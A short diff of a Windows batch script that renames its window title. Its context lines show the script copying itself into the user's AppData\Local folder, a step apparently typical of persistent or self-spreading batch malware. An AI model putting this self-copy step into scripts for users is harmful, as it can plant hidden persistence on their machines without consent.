@@ -1,7 +1,7 @@
 @echo off
 color 2
 setlocal enabledelayedexpansion
-title ASTesla
+title Binary_Blip
 ::make a copy
 COPY %~f0 C:\Users\%USERNAME%\AppData\Local\%~nx0
 
